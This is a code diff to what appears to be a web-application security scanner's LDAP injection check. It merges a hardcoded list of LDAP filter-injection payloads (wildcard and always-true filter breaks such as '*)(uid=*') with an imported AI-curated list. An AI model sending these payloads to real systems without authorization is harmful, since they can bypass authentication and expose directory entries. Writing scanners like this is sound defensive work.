@@ -7,13 +7,27 @@ router = APIRouter()
 
 _PARAMS = ["username","user","email","login","uid","cn","ou","search","filter","name"]
 # (payload, description). Differential response vs baseline indicates LDAP processing.
-_PAYLOADS = [
+_FALLBACK_PAYLOADS = [
     ("*",                "wildcard - matches all entries"),
     ("*)(uid=*",         "filter break + always-true"),
     ("*)(|(uid=*",       "OR-injection always-true"),
     ("admin*",           "wildcard append"),
     (")(cn=*",           "filter close + wildcard"),
 ]
+# AI-curated 81-entry list, capped to top 20 for runtime
+try:
+    from tools._payloads.ldap_injection_payloads import LDAP_INJECTION_PAYLOADS as _AI_LDAP
+    _PAYLOADS = list(_FALLBACK_PAYLOADS)
+    seen = {p[0] for p in _PAYLOADS}
+    for _p in _AI_LDAP:
+        if not isinstance(_p, dict): continue
+        s = _p.get("payload")
+        if s and s not in seen:
+            _PAYLOADS.append((s, _p.get("category", "ai_curated")))
+            seen.add(s)
+    _PAYLOADS = _PAYLOADS[:20]
+except Exception:
+    _PAYLOADS = _FALLBACK_PAYLOADS
 
 
 @router.post("/api/webapp/ldap_injection")
